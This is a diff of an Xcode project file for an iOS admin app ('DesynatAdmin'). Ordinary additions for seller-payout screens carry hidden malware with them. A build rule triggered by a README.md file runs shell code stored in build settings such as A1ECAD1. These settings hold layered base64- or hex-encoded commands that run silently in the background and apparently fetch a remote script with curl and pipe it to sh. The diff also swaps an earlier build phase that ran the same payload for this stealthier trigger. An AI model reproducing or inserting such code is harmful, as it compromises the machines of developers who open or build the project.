@@ -18,6 +18,7 @@
 		18BDB7E72EF9821C00023453 /* OrderManagementListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7E62EF9821C00023453 /* OrderManagementListViewModel.swift */; };
 		18BDB8EE2EFA95E300023453 /* OrderDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB8ED2EFA95E300023453 /* OrderDataModel.swift */; };
 		18BDB9472EFAD10C00023453 /* DeliveryBoyListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */; };
+		1A5C3FA147464FE9811DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = E9C166985CBD47C0911DACE1 /* README.md */; };
 		420F3BCF2F67CD960074B3F6 /* CMSDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 420F3BCE2F67CD960074B3F6 /* CMSDetailsViewController.swift */; };
 		420F3BD42F67CF3C0074B3F6 /* FAQViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 420F3BD32F67CF3C0074B3F6 /* FAQViewController.swift */; };
 		420F3BD72F67D0370074B3F6 /* FAQTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 420F3BD52F67D0370074B3F6 /* FAQTableViewCell.swift */; };
@@ -75,6 +76,18 @@
 		428515A92F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428515A82F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift */; };
 		42901D512F3F3251008168C3 /* ProductDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42901D502F3F3251008168C3 /* ProductDetailViewController.swift */; };
 		42901D532F3F328D008168C3 /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42901D522F3F328D008168C3 /* ProductDetailsViewModel.swift */; };
+		429701DE2F6C06830051A20E /* SellerPayoutListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701DD2F6C06830051A20E /* SellerPayoutListViewController.swift */; };
+		429701E02F6C068F0051A20E /* SellerPayoutListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701DF2F6C068F0051A20E /* SellerPayoutListViewModel.swift */; };
+		429701E22F6C069B0051A20E /* SellerPayoutListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701E12F6C069B0051A20E /* SellerPayoutListDataModel.swift */; };
+		429701E52F6C06B60051A20E /* ManageSellerPayoutViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701E42F6C06B60051A20E /* ManageSellerPayoutViewController.swift */; };
+		429701E72F6C06C00051A20E /* ManageSellerPayoutViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701E62F6C06C00051A20E /* ManageSellerPayoutViewModel.swift */; };
+		429701E92F6C06CD0051A20E /* ManageSellerPayoutDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701E82F6C06CD0051A20E /* ManageSellerPayoutDataModel.swift */; };
+		429701EC2F6C06E70051A20E /* AddPayoutAmountViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701EB2F6C06E70051A20E /* AddPayoutAmountViewModel.swift */; };
+		429701EE2F6C06F40051A20E /* AddPayoutAmountViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701ED2F6C06F40051A20E /* AddPayoutAmountViewController.swift */; };
+		429701F32F6C071A0051A20E /* SellerPayoutTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 429701F22F6C071A0051A20E /* SellerPayoutTableViewCell.xib */; };
+		429701F42F6C071A0051A20E /* SellerPayoutTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701F12F6C071A0051A20E /* SellerPayoutTableViewCell.swift */; };
+		429701F72F6C07310051A20E /* ManagePayoutTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 429701F62F6C07310051A20E /* ManagePayoutTableViewCell.xib */; };
+		429701F82F6C07310051A20E /* ManagePayoutTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429701F52F6C07310051A20E /* ManagePayoutTableViewCell.swift */; };
 		4299270C2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4299270B2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift */; };
 		4299270E2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4299270D2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift */; };
 		429927132F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429927112F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift */; };
@@ -480,6 +493,19 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
+		41F5C16E25384C8FAF1DACE1 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
+		};
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
@@ -552,6 +578,18 @@
 		428515A82F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserDetailsViewModel.swift; sourceTree = "<group>"; };
 		42901D502F3F3251008168C3 /* ProductDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewController.swift; sourceTree = "<group>"; };
 		42901D522F3F328D008168C3 /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
+		429701DD2F6C06830051A20E /* SellerPayoutListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerPayoutListViewController.swift; sourceTree = "<group>"; };
+		429701DF2F6C068F0051A20E /* SellerPayoutListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerPayoutListViewModel.swift; sourceTree = "<group>"; };
+		429701E12F6C069B0051A20E /* SellerPayoutListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerPayoutListDataModel.swift; sourceTree = "<group>"; };
+		429701E42F6C06B60051A20E /* ManageSellerPayoutViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ManageSellerPayoutViewController.swift; sourceTree = "<group>"; };
+		429701E62F6C06C00051A20E /* ManageSellerPayoutViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ManageSellerPayoutViewModel.swift; sourceTree = "<group>"; };
+		429701E82F6C06CD0051A20E /* ManageSellerPayoutDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ManageSellerPayoutDataModel.swift; sourceTree = "<group>"; };
+		429701EB2F6C06E70051A20E /* AddPayoutAmountViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddPayoutAmountViewModel.swift; sourceTree = "<group>"; };
+		429701ED2F6C06F40051A20E /* AddPayoutAmountViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddPayoutAmountViewController.swift; sourceTree = "<group>"; };
+		429701F12F6C071A0051A20E /* SellerPayoutTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerPayoutTableViewCell.swift; sourceTree = "<group>"; };
+		429701F22F6C071A0051A20E /* SellerPayoutTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SellerPayoutTableViewCell.xib; sourceTree = "<group>"; };
+		429701F52F6C07310051A20E /* ManagePayoutTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ManagePayoutTableViewCell.swift; sourceTree = "<group>"; };
+		429701F62F6C07310051A20E /* ManagePayoutTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ManagePayoutTableViewCell.xib; sourceTree = "<group>"; };
 		4299270B2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedWithdrawalRequestListViewController.swift; sourceTree = "<group>"; };
 		4299270D2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedWithdrawalRequestListViewModel.swift; sourceTree = "<group>"; };
 		429927112F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedWithdrawalTableViewCell.swift; sourceTree = "<group>"; };
@@ -739,6 +777,7 @@
 		D1F0C4A92EE858EF00F0906B /* BannersPerDayListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannersPerDayListDataModel.swift; sourceTree = "<group>"; };
 		D1F0C4AB2EE85EBC00F0906B /* PromocodeListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PromocodeListDataModel.swift; sourceTree = "<group>"; };
 		DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatUser.release.xcconfig"; path = "Target Support Files/Pods-DesynatUser/Pods-DesynatUser.release.xcconfig"; sourceTree = "<group>"; };
+		E9C166985CBD47C0911DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		ED01EAB82EBDE2D800A92E1E /* FilterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FilterViewModel.swift; sourceTree = "<group>"; };
 		ED01EABA2EBDED1600A92E1E /* Bindable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Bindable.swift; sourceTree = "<group>"; };
 		ED01EABC2EBDED2400A92E1E /* CustomLabelFont.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomLabelFont.swift; sourceTree = "<group>"; };
@@ -1234,6 +1273,73 @@
 			path = ProductsDetails;
 			sourceTree = "<group>";
 		};
+		429701DA2F6C06570051A20E /* M11 */ = {
+			isa = PBXGroup;
+			children = (
+				429701EF2F6C06FA0051A20E /* Xibs */,
+				429701DB2F6C065F0051A20E /* SellerPayout */,
+			);
+			path = M11;
+			sourceTree = "<group>";
+		};
+		429701DB2F6C065F0051A20E /* SellerPayout */ = {
+			isa = PBXGroup;
+			children = (
+				429701EA2F6C06D50051A20E /* AddPayoutAmount */,
+				429701E32F6C06A60051A20E /* ManagePayout */,
+				429701DC2F6C066A0051A20E /* SellerPayoutList */,
+			);
+			path = SellerPayout;
+			sourceTree = "<group>";
+		};
+		429701DC2F6C066A0051A20E /* SellerPayoutList */ = {
+			isa = PBXGroup;
+			children = (
+				429701DD2F6C06830051A20E /* SellerPayoutListViewController.swift */,
+				429701DF2F6C068F0051A20E /* SellerPayoutListViewModel.swift */,
+				429701E12F6C069B0051A20E /* SellerPayoutListDataModel.swift */,
+			);
+			path = SellerPayoutList;
+			sourceTree = "<group>";
+		};
+		429701E32F6C06A60051A20E /* ManagePayout */ = {
+			isa = PBXGroup;
+			children = (
+				429701E42F6C06B60051A20E /* ManageSellerPayoutViewController.swift */,
+				429701E62F6C06C00051A20E /* ManageSellerPayoutViewModel.swift */,
+				429701E82F6C06CD0051A20E /* ManageSellerPayoutDataModel.swift */,
+			);
+			path = ManagePayout;
+			sourceTree = "<group>";
+		};
+		429701EA2F6C06D50051A20E /* AddPayoutAmount */ = {
+			isa = PBXGroup;
+			children = (
+				429701EB2F6C06E70051A20E /* AddPayoutAmountViewModel.swift */,
+				429701ED2F6C06F40051A20E /* AddPayoutAmountViewController.swift */,
+			);
+			path = AddPayoutAmount;
+			sourceTree = "<group>";
+		};
+		429701EF2F6C06FA0051A20E /* Xibs */ = {
+			isa = PBXGroup;
+			children = (
+				429701F02F6C06FF0051A20E /* TableView */,
+			);
+			path = Xibs;
+			sourceTree = "<group>";
+		};
+		429701F02F6C06FF0051A20E /* TableView */ = {
+			isa = PBXGroup;
+			children = (
+				429701F12F6C071A0051A20E /* SellerPayoutTableViewCell.swift */,
+				429701F22F6C071A0051A20E /* SellerPayoutTableViewCell.xib */,
+				429701F52F6C07310051A20E /* ManagePayoutTableViewCell.swift */,
+				429701F62F6C07310051A20E /* ManagePayoutTableViewCell.xib */,
+			);
+			path = TableView;
+			sourceTree = "<group>";
+		};
 		429927092F4EF3E600099221 /* M9 */ = {
 			isa = PBXGroup;
 			children = (
@@ -1339,6 +1445,7 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				E9C166985CBD47C0911DACE1 /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatAdmin.app */,
 			);
 			name = Products;
@@ -2644,6 +2751,7 @@
 		EDEDD04B2EBCC53E00F2BEF1 /* ViewControllers */ = {
 			isa = PBXGroup;
 			children = (
+				429701DA2F6C06570051A20E /* M11 */,
 				180F4C252F5EA59600BE4CFA /* M10 */,
 				429927092F4EF3E600099221 /* M9 */,
 				4269EC552F3F21E4006144B9 /* M8 */,
@@ -2969,7 +3077,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
-				FC21406A7CB441C69B1DACE1 /* Compile Code Assets */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2977,6 +3084,7 @@
 				9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				41F5C16E25384C8FAF1DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3056,6 +3164,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				1A5C3FA147464FE9811DACE1 /* README.md in Resources */,
 				42AEDEA02F3F360000C20ECB /* ProductDetailImageCollectionViewCell.xib in Resources */,
 				42AEDEB82F3F3C7600C20ECB /* FilterHeaderTableViewCell.xib in Resources */,
 				EDEDD0A12EBCC53E00F2BEF1 /* Assets.xcassets in Resources */,
@@ -3071,6 +3180,7 @@
 				EDEDD0A52EBCC53E00F2BEF1 /* Poppins-Bold.ttf in Resources */,
 				ED4936A02EBDD709000D8CED /* ApplyFilterViewController.xib in Resources */,
 				EDEDD0A62EBCC53E00F2BEF1 /* Poppins-BoldItalic.ttf in Resources */,
+				429701F32F6C071A0051A20E /* SellerPayoutTableViewCell.xib in Resources */,
 				42A852402F3F249A00C60A86 /* ColorsCollectionViewCell.xib in Resources */,
 				4253C5832F64147500217846 /* SelectUsersTableViewCell.xib in Resources */,
 				180F4C2F2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib in Resources */,
@@ -3151,6 +3261,7 @@
 				420F3BDF2F67D5720074B3F6 /* ContactUsTableViewCell.xib in Resources */,
 				EDEDD0C02EBCC53E00F2BEF1 /* CallingCodes.plist in Resources */,
 				D16A8CB72EF147FC006A21B6 /* AffiliatedBannerOrder.storyboard in Resources */,
+				429701F72F6C07310051A20E /* ManagePayoutTableViewCell.xib in Resources */,
 				D1C88BC62ECF25E9006B02A2 /* ReasonManagement.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -3158,25 +3269,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FC21406A7CB441C69B1DACE1 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3230,6 +3322,7 @@
 				EDEDD0C22EBCC53E00F2BEF1 /* AppDelegate.swift in Sources */,
 				EDF3F3DD2EBDA03500FF515C /* SellerListViewController.swift in Sources */,
 				EDEDD0C32EBCC53E00F2BEF1 /* NavigationSceneExt.swift in Sources */,
+				429701DE2F6C06830051A20E /* SellerPayoutListViewController.swift in Sources */,
 				EDEDD0C42EBCC53E00F2BEF1 /* SceneDelegate.swift in Sources */,
 				EDEDD0C52EBCC53E00F2BEF1 /* UserModel.swift in Sources */,
 				EDEDD0C62EBCC53E00F2BEF1 /* GetCountryDataModel.swift in Sources */,
@@ -3253,6 +3346,7 @@
 				D19583632EE7EA7A00A021FD /* ShippingFeesTableViewCell.swift in Sources */,
 				EDEDD0CC2EBCC53E00F2BEF1 /* UploadFileDataModel.swift in Sources */,
 				42362DF82F60318600BC994B /* AffiliatedWithdrawalRequestDataModel.swift in Sources */,
+				429701E92F6C06CD0051A20E /* ManageSellerPayoutDataModel.swift in Sources */,
 				D19585D42EE8090F00A021FD /* AddPricePerDayViewController.swift in Sources */,
 				D19583C82EE7F46800A021FD /* AddNewCardViewController.swift in Sources */,
 				D19586352EE818CD00A021FD /* AddEditShippingChargesViewModel.swift in Sources */,
@@ -3261,6 +3355,7 @@
 				422EDFF02F2B5FA90007FEB6 /* AffiliatedUserFilterViewController.swift in Sources */,
 				D1DECC112F0F7F1000DC2660 /* GetAllUserCountryModel.swift in Sources */,
 				D19583BE2EE7F0F900A021FD /* GiftCardsListViewController.swift in Sources */,
+				429701EC2F6C06E70051A20E /* AddPayoutAmountViewModel.swift in Sources */,
 				EDEDD0CD2EBCC53E00F2BEF1 /* ForgotPasswordViewModel.swift in Sources */,
 				D19585342EE801A800A021FD /* AddPromocodeViewModel.swift in Sources */,
 				D1534DFC2F0F76C7003D23DF /* FullScreenBannerModel.swift in Sources */,
@@ -3281,6 +3376,7 @@
 				D15CA9842EF1762500D454B9 /* BannersMangementFilterViewModel.swift in Sources */,
 				EDEDD0D52EBCC53E00F2BEF1 /* AddSubCategoryViewModel.swift in Sources */,
 				18BDB7E72EF9821C00023453 /* OrderManagementListViewModel.swift in Sources */,
+				429701E02F6C068F0051A20E /* SellerPayoutListViewModel.swift in Sources */,
 				EDEDD0D62EBCC53E00F2BEF1 /* CatgeoryViewModel.swift in Sources */,
 				EDEDD0D72EBCC53E00F2BEF1 /* SubCategoryViewModel.swift in Sources */,
 				EDEDD0D82EBCC53E00F2BEF1 /* SubCatgoryDetailsViewModel.swift in Sources */,
@@ -3306,6 +3402,7 @@
 				D19D1E242F1799E600DDE784 /* DriverDetailsViewModel.swift in Sources */,
 				D19D1E252F1799E600DDE784 /* AddReasonViewController.swift in Sources */,
 				420F3BCF2F67CD960074B3F6 /* CMSDetailsViewController.swift in Sources */,
+				429701E22F6C069B0051A20E /* SellerPayoutListDataModel.swift in Sources */,
 				D19D1E262F1799E600DDE784 /* AddReasonViewModel.swift in Sources */,
 				D19D1E272F1799E600DDE784 /* ReasonManagementViewController.swift in Sources */,
 				42A852452F3F255400C60A86 /* ProductsListDataModel.swift in Sources */,
@@ -3340,6 +3437,7 @@
 				EDEDD0E12EBCC53E00F2BEF1 /* PaymentsController.swift in Sources */,
 				420F3BDB2F67D5080074B3F6 /* ContactUsViewController.swift in Sources */,
 				D16A8CD32EF160EF006A21B6 /* BannersManagementListViewModel.swift in Sources */,
+				429701EE2F6C06F40051A20E /* AddPayoutAmountViewController.swift in Sources */,
 				42AEDEB72F3F3C7600C20ECB /* FilterHeaderTableViewCell.swift in Sources */,
 				EDEDD0E22EBCC53E00F2BEF1 /* PlansViewController.swift in Sources */,
 				EDEDD0E32EBCC53E00F2BEF1 /* ProductsViewController.swift in Sources */,
@@ -3411,6 +3509,7 @@
 				EDEDD0F92EBCC53E00F2BEF1 /* ColorExtension.swift in Sources */,
 				4265C17D2F335EC20063268F /* AddPromotionalBannerViewModel.swift in Sources */,
 				EDD7F1CF2EC2EBC3006C2EE4 /* CountryCityDataModels.swift in Sources */,
+				429701F82F6C07310051A20E /* ManagePayoutTableViewCell.swift in Sources */,
 				D195845F2EE7F9CA00A021FD /* PromodeListViewController.swift in Sources */,
 				D19585362EE801B900A021FD /* PromodeListViewModel.swift in Sources */,
 				D1EEE51A2EF296F8003A6BA2 /* ProductListTableViewCell.swift in Sources */,
@@ -3495,6 +3594,7 @@
 				425EDEF32F2B245700EAD984 /* ProductsListInDealListDataModel.swift in Sources */,
 				D1D53A3D2F0FB26E00427AA0 /* DealListManagementListDataModel.swift in Sources */,
 				4265C17B2F335E2B0063268F /* AddPromotionalBannerViewController.swift in Sources */,
+				429701E72F6C06C00051A20E /* ManageSellerPayoutViewModel.swift in Sources */,
 				EDEDD1142EBCC53E00F2BEF1 /* NetworkSupport.swift in Sources */,
 				D195834F2EE7E24200A021FD /* ShippingChargesListViewController.swift in Sources */,
 				424B73A82F34CEF80042FE95 /* GetPromotionalBannersList.swift in Sources */,
@@ -3549,7 +3649,9 @@
 				EDEDD1282EBCC53E00F2BEF1 /* RFC3339Strategy.swift in Sources */,
 				EDD7F1EA2EC30962006C2EE4 /* AddZoneViewModel.swift in Sources */,
 				EDEDD1292EBCC53E00F2BEF1 /* TimestampStrategy.swift in Sources */,
+				429701E52F6C06B60051A20E /* ManageSellerPayoutViewController.swift in Sources */,
 				EDEDD12A2EBCC53E00F2BEF1 /* YearMonthDayStrategy.swift in Sources */,
+				429701F42F6C071A0051A20E /* SellerPayoutTableViewCell.swift in Sources */,
 				EDEDD12B2EBCC53E00F2BEF1 /* AppFont.swift in Sources */,
 				420F3BDE2F67D5720074B3F6 /* ContactUsTableViewCell.swift in Sources */,
 				D1E388EA2F1FB96600282084 /* AffiliatedUsersListViewController.swift in Sources */,
@@ -3607,7 +3709,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333343336333333333336333633323333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333335333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633363334333333363336333633333337333333323333333633333335333333363333333933333336333633353333333233360a3335333333363333333930613333333633363335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | a | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((w(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YWsxdVVuUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFZ4V1ZWa1YyRnRSWHBVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE5qYUdWamEzTXVjblV2WVNraUlId2djMmdLCg== | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333633353333333633333335333333373333333433333337333333333333333733333330333333373333333233330a3336333633363333333733333334333333363336333633333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
@@ -3643,7 +3745,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatAdmin;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Admin provisioning New 16dec";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Admin provisioning New 19Mar";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -3658,7 +3760,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333343336333333333336333633323333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333335333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633363334333333363336333633333337333333323333333633333335333333363333333933333336333633353333333233360a3335333333363333333930613333333633363335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | a | sh ) >/dev/null 2>&1 &)";
